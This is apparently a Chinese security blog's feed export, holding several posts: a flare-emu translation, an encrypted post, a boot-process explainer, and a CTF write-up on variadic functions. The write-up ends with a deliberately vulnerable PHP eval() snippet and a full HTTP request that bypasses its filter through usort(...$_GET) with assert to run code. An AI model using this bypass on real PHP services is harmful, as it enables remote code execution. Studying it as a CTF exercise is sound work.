<p>​                                                  Figure 8: Objective-C IDB snippet after running objc2_analyzer </p>
<p>请注意已对引用选择器的指令进行了修补，以改为引用实现功能本身，以便于转换。 添加到每个call中的注释使分析更加容易。 还创建了来自实现功能的交叉引用，以指向指向引用它们的objc_msgSend调用，如图9所示。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture9.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture9.png"></p>
<p>​                                                         图9：为函数实现添加到IDB的交叉引用</p>
<p>应当注意，从7.0开始的每个IDA Pro版本都对Objective-C代码分析和处理进行了改进。 但是，在撰写本文时，IDA Pro的最新版本为7.2，使用该工具仍可消除一些缺点，并添加了非常有用的注释。 objc2_analyzer以及我们的其他IDA Pro插件和脚本可在我们的<a href="https://github.com/fireeye/flare-ida" target="_blank" rel="noopener">GitHub</a>页面上获得。</p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>flare-emu是一种灵活的工具，您可以在您的军械库中收藏它，它可以应用于各种代码分析问题。 在本博文中使用它提出并解决了几个示例问题，但这只是其应用可能性的一瞥。如果您没有尝试模拟解决代码分析问题的方法，我们希望您现在可以选择它。 而且，我们希望您能从使用这些新工具中受益匪浅！</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>binary</tag>
        <tag>学习记录</tag>
      </tags>
  </entry>
  <entry>
    <title>社会学角度看恋爱关系</title>
    <url>/2022/12/23/%E7%A4%BE%E4%BC%9A%E5%AD%A6%E8%A7%92%E5%BA%A6%E7%9C%8B%E6%81%8B%E7%88%B1%E5%85%B3%E7%B3%BB/</url>
    <content><![CDATA[<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />
    <label for="pass">Please enter the password to read the blog.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">
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
</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>心理学</tag>
        <tag>脱单</tag>
      </tags>
  </entry>
  <entry>
    <title>由phithon的一个题目谈可变参数函数</title>
    <url>/2017/01/20/%E7%94%B1phithon%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E8%B0%88%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h3 id="可变参数函数"><a href="#可变参数函数" class="headerlink" title="可变参数函数"></a>可变参数函数</h3><p>可变参数函数是指参数个数可变的函数,在函数声明和定义的时候并没有明确的指出函数需要的参数个数,具体有多少个参数,是在调用的时候确定的.<br>可变参数函数并不是什么新奇的东西,早在我们学c语言的时候,就见过,例如我们常用的printf()和scanf()函数.<br>printf() 的函数原型是</p>
<a id="more"></a>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>　<span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* format,...)</span></span>;    <span class="comment">//至少要有一个参数</span></span><br></pre></td></tr></table></figure>
<p>我们写下面的代码看一下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span>  param1=<span class="number">1</span>,param2=<span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"一个参数:%d\n"</span>,param1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"一个参数:%d,第二个参数：%d\n"</span>,param1,param2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们都会用这样的函数，但是却没用自己动手写过可便参数的函数．　</p>
<h3 id="自己动手写可变参数的函数"><a href="#自己动手写可变参数的函数" class="headerlink" title="自己动手写可变参数的函数"></a>自己动手写可变参数的函数</h3><p>在c语言中要实现一个可变参函数,需要用到一下的宏</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">va_start</span><span class="params">( va_list arg_ptr, prev_param )</span></span>;</span><br><span class="line"><span class="function">type <span class="title">va_arg</span><span class="params">( va_list arg_ptr, type )</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">va_end</span><span class="params">( va_list arg_ptr )</span></span>;</span><br></pre></td></tr></table></figure>
<p>这些宏定义在stdarg.h头文件中,所以在写可变参数函数的时候需要包含此头文件. gcc编译器使用内置宏间接实现变参宏，如#define va_start(v,l)  __builtin_va_start(v,l)。因为gcc编译器需要考虑跨平台处理，而其实现因平台而异。<br> C调用约定下可使用va_list系列变参宏实现变参函数，此处va意为variable-argument(可变参数)。典型用法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">VarArgFunc</span><span class="params">(<span class="keyword">int</span> dwFixedArg, ...)</span></span>&#123; <span class="comment">//以固定参数的地址为起点依次确定各变参的内存起始地址</span></span><br><span class="line">    va_list pArgs = <span class="literal">NULL</span>;  <span class="comment">//定义va_list类型的指针pArgs，用于存储参数地址</span></span><br><span class="line">    va_start(pArgs, dwFixedArg); <span class="comment">//初始化pArgs指针，使其指向第一个可变参数。该宏第二个参数是变参列表的前一个参数，即最后一个固定参数</span></span><br><span class="line">    <span class="keyword">int</span> dwVarArg = va_arg(pArgs, <span class="keyword">int</span>); <span class="comment">//该宏返回变参列表中的当前变参值并使pArgs指向列表中的下个变参。该宏第二个参数是要返回的当前变参类型</span></span><br><span class="line">    <span class="comment">//若函数有多个可变参数，则依次调用va_arg宏获取各个变参</span></span><br><span class="line">    va_end(pArgs);  <span class="comment">//将指针pArgs置为无效，结束变参的获取</span></span><br><span class="line">    <span class="comment">/* Code Block using variable arguments */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//可在头文件中声明函数为extern int VarArgFunc(int dwFixedArg, ...);，调用时用VarArgFunc(FixedArg, VarArg);</span></span><br></pre></td></tr></table></figure>
<p>如下函数实现n个整数相加(n&gt;=1),但是定义函数之前并不知道到底是几个数相加,代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> n, ...)</span>  <span class="comment">//第一个参数表明有可变参数有多少个相加  </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    va_list ap;</span><br><span class="line">    va_start(ap, n);</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">        sum += va_arg(ap, <span class="keyword">int</span>);</span><br><span class="line">    va_end(ap);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="python-中的可变参数函数"><a href="#python-中的可变参数函数" class="headerlink" title="python 中的可变参数函数"></a>python 中的可变参数函数</h3><p>python中定义函数,可以使用<em>args和*</em>kwargs将不定量的参数传递给一个函数,<em>args发送一个非键值对的可变数量的参数列表给一个函数，*</em>kwargs允许你将不定长度的键值对(key,value), 作为参数传递给一个函数。<br>例子如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">function1</span><span class="params">(arg1,arg2,arg3)</span>:</span></span><br><span class="line">    <span class="comment"># print "function1"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"arg1:"</span>,arg1</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"arg2:"</span>,arg2</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"arg3:"</span>,arg3</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">function2</span><span class="params">(*args)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"arg from args:"</span>,arg </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">function3</span><span class="params">(**kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> kwargs.items():</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&#123;key&#125;==&#123;value&#125;"</span>.format(key=key,value=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function1(<span class="string">"one"</span>,<span class="string">"two"</span>,<span class="string">"three"</span>)</span><br><span class="line">args=(<span class="string">"one"</span>,<span class="string">"two"</span>,<span class="string">"three"</span>)</span><br><span class="line">function2(*args)</span><br><span class="line">kwargs=&#123;<span class="string">"1"</span>:<span class="string">"one"</span>,<span class="string">"2"</span>:<span class="string">"two"</span>&#125;</span><br><span class="line">function3(**kwargs)</span><br></pre></td></tr></table></figure>
<p>最后的输出:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arg1: one</span><br><span class="line">arg2: two</span><br><span class="line">arg3: three</span><br><span class="line">arg from args: one</span><br><span class="line">arg from args: two</span><br><span class="line">arg from args: three</span><br><span class="line">1==one</span><br><span class="line">2==two</span><br></pre></td></tr></table></figure>
<h3 id="php中的可变参函数"><a href="#php中的可变参函数" class="headerlink" title="php中的可变参函数"></a>php中的可变参函数</h3><p>php5.6引入了一个新特性,PHP中可以使用 <code>func(...$arr)</code>这样的方式，将<code>$arr</code>数组展开成多个参数，传入func函数。<a href="http://php.net/manual/zh/migration56.new-features.php" target="_blank" rel="noopener">Manual</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span><span class="params">($req, $opt = null, ...$params)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// $params 是一个包含了剩余参数的数组</span></span><br><span class="line">    printf(<span class="string">'$req: %d; $opt: %d; number of params: %d'</span>.<span class="string">"\n"</span>,</span><br><span class="line">           $req, $opt, count($params));</span><br><span class="line">&#125;</span><br><span class="line">f(<span class="number">1</span>);</span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>最后的输出:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$req</span>: 1; <span class="variable">$opt</span>: 0; number of params: 0</span><br><span class="line"><span class="variable">$req</span>: 1; <span class="variable">$opt</span>: 2; number of params: 0</span><br><span class="line"><span class="variable">$req</span>: 1; <span class="variable">$opt</span>: 2; number of params: 1</span><br><span class="line"><span class="variable">$req</span>: 1; <span class="variable">$opt</span>: 2; number of params: 2</span><br><span class="line"><span class="variable">$req</span>: 1; <span class="variable">$opt</span>: 2; number of params: 3</span><br></pre></td></tr></table></figure>
<h3 id="最后来看phithon的题目"><a href="#最后来看phithon的题目" class="headerlink" title="最后来看phithon的题目:"></a>最后来看phithon的题目:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$param = $_REQUEST[<span class="string">'param'</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen($param)&lt;<span class="number">17</span> &amp;&amp; stripos($param,<span class="string">'eval'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($param,<span class="string">'assert'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($param);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h6 id="要求必须getshell"><a href="#要求必须getshell" class="headerlink" title="要求必须getshell"></a>要求必须getshell</h6><p>phithon 给出的标准答案是:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:8081</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 22</span><br><span class="line"></span><br><span class="line">param=usort(...$_GET);</span><br></pre></td></tr></table></figure>
<p>$_GET变量 被展开为两个参数 [‘test’,’phpinfo();’]和assert,传入usort函数.usort函数第二个参数是回调函数assert,执行了第一个参数中的phpinfo(). 这样就可以达到getshell的效果.</p>
<h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a></p>
<p><a href="http://www.cnblogs.com/clover-toeic/p/3736748.html" target="_blank" rel="noopener">http://www.cnblogs.com/clover-toeic/p/3736748.html</a></p>
]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机是如何启动的？</title>
    <url>/2016/04/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E5%A6%82%E4%BD%95%E5%90%AF%E5%8A%A8%E7%9A%84/</url>
    <content><![CDATA[<a id="more"></a>
<p><strong>觉得deepin很好玩 ，就安装了一个，可以电脑启动默认先进grub，加载linux的启动引到，无法默认加载windows启动引导，研究的过程中发现下面 一篇好文章，分享一下</strong><br>从打开电源到开始操作，计算机的启动是一个非常复杂的过程。</p>
<p>我一直搞不清楚，这个过程到底是怎么回事，只看见屏幕快速滚动各种提示…… 这几天，我查了一些资料，试图搞懂它。下面就是我整理的笔记。<br>零、boot的含义<br>先问一个问题，”启动”用英语怎么说？<br>回答是boot。可是，boot原来的意思是靴子，”启动”与靴子有什么关系呢？ 原来，这里的boot是bootstrap（鞋带）的缩写，它来自一句谚语：<br>“pull oneself up by one’s bootstraps”<br>字面意思是”拽着鞋带把自己拉起来”，这当然是不可能的事情。最早的时候，工程师们用它来比喻，计算机启动是一个很矛盾的过程：必须先运行程序，然后计算机才能启动，但是计算机不启动就无法运行程序！<br>早期真的是这样，必须想尽各种办法，把一小段程序装进内存，然后计算机才能正常运行。所以，工程师们把这个过程叫做”拉鞋带”，久而久之就简称为boot了。<br>计算机的整个启动过程分成四个阶段。<br>一、第一阶段：BIOS<br>上个世纪70年代初，”只读内存”（read-only memory，缩写为ROM）发明，开机程序被刷入ROM芯片，计算机通电后，第一件事就是读取它。</p>
<p>这块芯片里的程序叫做”基本輸出輸入系統”（Basic Input/Output System），简称为BIOS。<br>1.1 硬件自检<br>BIOS程序首先检查，计算机硬件能否满足运行的基本条件，这叫做”硬件自检”（Power-On Self-Test），缩写为POST。<br>如果硬件出现问题，主板会发出不同含义的蜂鸣，启动中止。如果没有问题，屏幕就会显示出CPU、内存、硬盘等信息。</p>
<p>1.2 启动顺序<br>硬件自检完成后，BIOS把控制权转交给下一阶段的启动程序。<br>这时，BIOS需要知道，”下一阶段的启动程序”具体存放在哪一个设备。也就是说，BIOS需要有一个外部储存设备的排序，排在前面的设备就是优先转交控制权的设备。这种排序叫做”启动顺序”（Boot Sequence）。<br>打开BIOS的操作界面，里面有一项就是”设定启动顺序”。</p>
<p>二、第二阶段：主引导记录<br>BIOS按照”启动顺序”，把控制权转交给排在第一位的储存设备。<br>这时，计算机读取该设备的第一个扇区，也就是读取最前面的512个字节。如果这512个字节的最后两个字节是0x55和0xAA，表明这个设备可以用于启动；如果不是，表明设备不能用于启动，控制权于是被转交给”启动顺序”中的下一个设备。<br>这最前面的512个字节，就叫做”主引导记录”（Master boot record，缩写为MBR）。<br>2.1 主引导记录的结构<br>“主引导记录”只有512个字节，放不了太多东西。它的主要作用是，告诉计算机到硬盘的哪一个位置去找操作系统。<br>主引导记录由三个部分组成：<br>（1） 第1-446字节：调用操作系统的机器码。<br>（2） 第447-510字节：分区表（Partition table）。<br>（3） 第511-512字节：主引导记录签名（0x55和0xAA）。<br>其中，第二部分”分区表”的作用，是将硬盘分成若干个区。<br>2.2 分区表<br>硬盘分区有很多好处。考虑到每个区可以安装不同的操作系统，”主引导记录”因此必须知道将控制权转交给哪个区。<br>分区表的长度只有64个字节，里面又分成四项，每项16个字节。所以，一个硬盘最多只能分四个一级分区，又叫做”主分区”。<br>每个主分区的16个字节，由6个部分组成：<br>（1） 第1个字节：如果为0x80，就表示该主分区是激活分区，控制权要转交给这个分区。四个主分区里面只能有一个是激活的。<br>（2） 第2-4个字节：主分区第一个扇区的物理位置（柱面、磁头、扇区号等等）。<br>（3） 第5个字节：主分区类型。<br>（4） 第6-8个字节：主分区最后一个扇区的物理位置。<br>（5） 第9-12字节：该主分区第一个扇区的逻辑地址。<br>（6） 第13-16字节：主分区的扇区总数。<br>最后的四个字节（”主分区的扇区总数”），决定了这个主分区的长度。也就是说，一个主分区的扇区总数最多不超过2的32次方。<br>如果每个扇区为512个字节，就意味着单个分区最大不超过2TB。再考虑到扇区的逻辑地址也是32位，所以单个硬盘可利用的空间最大也不超过2TB。如果想使用更大的硬盘，只有2个方法：一是提高每个扇区的字节数，二是增加扇区总数。<br>三、第三阶段：硬盘启动<br>这时，计算机的控制权就要转交给硬盘的某个分区了，这里又分成三种情况。<br>3.1 情况A：卷引导记录<br>上一节提到，四个主分区里面，只有一个是激活的。计算机会读取激活分区的第一个扇区，叫做”卷引导记录”（Volume boot record，缩写为VBR）。<br>“卷引导记录”的主要作用是，告诉计算机，操作系统在这个分区里的位置。然后，计算机就会加载操作系统了。<br>3.2 情况B：扩展分区和逻辑分区<br>随着硬盘越来越大，四个主分区已经不够了，需要更多的分区。但是，分区表只有四项，因此规定有且仅有一个区可以被定义成”扩展分区”（Extended partition）。<br>所谓”扩展分区”，就是指这个区里面又分成多个区。这种分区里面的分区，就叫做”逻辑分区”（logical partition）。<br>计算机先读取扩展分区的第一个扇区，叫做”扩展引导记录”（Extended boot record，缩写为EBR）。它里面也包含一张64字节的分区表，但是最多只有两项（也就是两个逻辑分区）。<br>计算机接着读取第二个逻辑分区的第一个扇区，再从里面的分区表中找到第三个逻辑分区的位置，以此类推，直到某个逻辑分区的分区表只包含它自身为止（即只有一个分区项）。因此，扩展分区可以包含无数个逻辑分区。<br>但是，似乎很少通过这种方式启动操作系统。如果操作系统确实安装在扩展分区，一般采用下一种方式启动。<br>3.3 情况C：启动管理器<br>在这种情况下，计算机读取”主引导记录”前面446字节的机器码之后，不再把控制权转交给某一个分区，而是运行事先安装的”启动管理器”（boot loader），由用户选择启动哪一个操作系统。<br>Linux环境中，目前最流行的启动管理器是Grub。</p>
<p>四、第四阶段：操作系统<br>控制权转交给操作系统后，操作系统的内核首先被载入内存。<br>以Linux系统为例，先载入/boot目录下面的kernel。内核加载成功后，第一个运行的程序是/sbin/init。它根据配置文件（Debian系统是/etc/initab）产生init进程。这是Linux启动后的第一个进程，pid进程编号为1，其他进程都是它的后代。<br>然后，init线程加载系统的各个模块，比如窗口程序和网络程序，直至执行/bin/login程序，跳出登录界面，等待用户输入用户名和密码。<br>至此，全部启动过程完成。</p>
<p><strong>原文地址：<a href="http://www.ruanyifeng.com/blog/2013/02/booting.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2013/02/booting.html</a></strong></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>boot</tag>
      </tags>
  </entry>
  <entry>
    <title>让wireshark以非root权限运行背后的linux Capabilities（简介）</title>
    <url>/2017/03/02/%E8%AE%A9wireshark%E4%BB%A5%E9%9D%9Eroot%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E8%83%8C%E5%90%8E%E7%9A%84linux%20Capabilities%EF%BC%88%E7%AE%80%E4%BB%8B%EF%BC%89/</url>
    <content><![CDATA[<a id="more"></a>

<h2 id="0x1-加入linux-Capabilities的背景知识"><a href="#0x1-加入linux-Capabilities的背景知识" class="headerlink" title="0x1 加入linux Capabilities的背景知识"></a>0x1 加入linux Capabilities的背景知识</h2><p>Linux是一种安全操作系统，它给普通用户尽可能低的权限，而把全部的系统权限赋予一个单一的帐户–root。root帐户用来管理系统、安装软件、管理帐户、运行某些服务、安装/卸载文件系统、管理用户、安装软件等。另外，普通用户的很多操作也需要root权限，这通过setuid实现。</p>
